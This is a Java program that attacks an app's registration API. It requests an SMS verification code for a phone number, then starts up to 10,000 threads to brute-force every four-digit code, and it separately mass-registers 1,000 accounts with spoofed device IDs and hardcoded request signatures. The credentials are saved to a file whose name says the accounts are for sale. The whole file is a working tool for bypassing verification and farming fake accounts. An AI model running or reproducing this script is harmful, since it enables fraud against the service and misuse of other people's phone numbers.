import java.util.*;
import org.json.*;
import java.io.*;

public class Main {
	private static final String APP_ID = "109";
	private static final String CHANNEL_ID = "208";
	private static final String SDK_VERSION = "2.0.0";

	public static void main(String[] args) throws Exception {
		createNewUserWithPhone("13980366666","nb803666");
		createNewUserQuickly(1000);
	}

	public static void createNewUserQuickly(final int num) throws Exception {
		JSONObject users = new JSONObject();
		users.put("Users", new JSONArray());

		for(int i = 0; i < num; i++) {
			String password = generatePassword();
			JSONObject user = createUser(password);
			users.getJSONArray("Users").put(user);
		}

		writeUsersToFile(users);
	}

	public static void createNewUserWithPhone(final String phone, final String password) throws Exception {
		verifySMS(phone);

		for(int i = 0; i <= 9999; i++) {
			final int[] ii = new int[]{i};
			new Thread(() -> {
				try {
					registerUser(phone, password, ii);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}).start();
		}
	}

	private static String generatePassword() throws Exception {
		String pass = "803666" + DESUtil.MD5((int)(Math.random() * 999999999) + "803666" + DESUtil.MD5(Math.random() * 6666666 + "")).substring(0, 10);
		return DESUtil.MD5(pass);
	}

	private static JSONObject createUser(String password) throws Exception {
		String request = "head={\"appId\":" + APP_ID + ",\"channelId\":" + CHANNEL_ID + ",\"sdkVersion\":\"" + SDK_VERSION + "\"}&registerInfo={\"password\":\"" + password + "\",\"registerImei\":\"d4a69032b29bf0cb\",\"smsVerifyCode\":\"466\"}&md5=b97259c1c0b6a077e7b7c6d89e3cf8de";
		String response = DESUtil.decrypt(HttpCilentClass.SendReqGetRes(DESUtil.encrypt(request).getBytes(), "oneKeyRegister"));
		JSONObject user = new JSONObject(DESUtil.decrypt(new JSONObject(response).getString("content")));
		user.put("password", password);
		return user;
	}

	private static void writeUsersToFile(JSONObject users) throws Exception {
		new FileOutputStream("/storage/emulated/0/APP_803/zzzzz803tool/app/build/bin/1000剧院号出售专用").write(users.toString(4).getBytes());
	}

	private static void verifySMS(String phone) throws Exception {
		String request = "head={\"appId\":" + APP_ID + ",\"channelId\":" + CHANNEL_ID + ",\"sdkVersion\":\"" + SDK_VERSION + "\"}&verifySMS={\"phone\":\"" + phone + "\",\"smsType\":\"register\"}&md5=c871511533afd4154ac5576e20a5bdcd";
		String response = DESUtil.decrypt(HttpCilentClass.SendReqGetRes(DESUtil.encrypt(request).getBytes(), "genVerifySms"));
		System.out.println(response);
	}

	private static void registerUser(String phone, String password, int[] ii) throws Exception {
		String y = String.format("%04d", ii[0]);
		String request = "head={\"appId\":" + APP_ID + ",\"channelId\":" + CHANNEL_ID + ",\"sdkVersion\":\"" + SDK_VERSION + "\"}&registerInfo={\"password\":\"" + DESUtil.MD5(password) + "\",\"phone\":\"" + phone + "\",\"registerImei\":\"b7cfe56034188670\",\"smsVerifyCode\":\"" + y + "\"}&md5=e6cb038859b93a01e5775be34f6238d4";
		String response = DESUtil.decrypt(HttpCilentClass.SendReqGetRes(DESUtil.encrypt(request).getBytes(), "register"));
		String content = new JSONObject(response).getString("content");

		if (!content.equals("验证码错误")) {
			System.out.println("创建成功");
			ii[0] = 9999;
		} else if (ii[0] % 100 == 0) {
			System.out.println(ii[0]);
		}
	}
}
